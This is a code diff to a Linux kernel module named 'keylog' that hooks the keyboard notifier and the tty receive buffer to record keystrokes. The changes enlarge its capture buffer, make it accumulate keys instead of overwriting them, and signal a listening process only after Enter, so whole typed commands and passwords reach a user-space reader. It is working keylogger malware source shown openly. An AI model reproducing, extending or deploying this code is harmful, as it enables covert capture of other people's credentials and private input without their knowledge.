@@ -24,7 +24,7 @@
 #define KEYLOG_MAJOR 65
 #define KEYLOG_NAME  "keylog"
 
-#define KEYLOG_BUF_SIZE 32
+#define KEYLOG_BUF_SIZE 1024
 
 MODULE_LICENSE( "Dual BSD/GPL" );
 
@@ -93,6 +93,7 @@ ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos ) {
         }
 
         *f_pos = cur_buf_length;
+        cur_buf_length = 0; // Reset buf length to read more content
         return *f_pos;
     } else {
         return 0;
@@ -116,6 +117,7 @@ struct file* file_open(const char* path, int flags, int rights) {
     return filp;   
 }
 
+// Sends the IO signal to let listening processes know a command was entered
 void SendKey()
 {
     struct siginfo     *sinfo;    /* signal information */
@@ -157,9 +159,14 @@ void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, 
             
             key_name = get_tty_key_str(dstStr, count);
 
-            cur_buf_length = sprintf( key_buffer, "%s", key_name );
+            if ( strlen( key_name ) + cur_buf_length < KEYLOG_BUF_SIZE ) {
+                cur_buf_length += sprintf( key_buffer + cur_buf_length, "%s", key_name );
+            }
             
-            SendKey();
+            // Wait until a command has been entered before notifying listeners
+            if ( strcmp( "Enter", key_name ) == 0  ) {
+                SendKey();
+            }
         }
     }
 
@@ -172,13 +179,17 @@ int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param
     char *key_name = NULL; 
     int startBuffering = registered_pid >= 0; // Don't buffer unless someone is listening
 
-    cur_buf_length = sprintf( key_buffer, "%s", key_name );
 
     if ( code == KBD_KEYCODE && param->down && startBuffering ) {
         key_name = GET_KEYNAME( param->value );
-        SendKey();
 
-        // print812( "Keycode %i %s\n", param->value, (param->down ? "down" : "up") );
+        if ( strlen( key_name ) + cur_buf_length < KEYLOG_BUF_SIZE ) {
+            cur_buf_length += sprintf( key_buffer + cur_buf_length, "%s", key_name );
+        }
+
+        if ( strcmp( "Enter", key_name ) == 0 ) {
+            SendKey();
+        }
     }
 
     return NOTIFY_OK;
@@ -224,7 +235,7 @@ static int hello_init( void ) {
 
     register_keyboard_notifier(&keyboardNotifierBlock);
     
-    file = file_open("/dev/tty1", O_RDONLY, 0);
+    // file = file_open("/dev/tty1", O_RDONLY, 0);
     if(file != NULL)
     {
         tty = file->private_data;
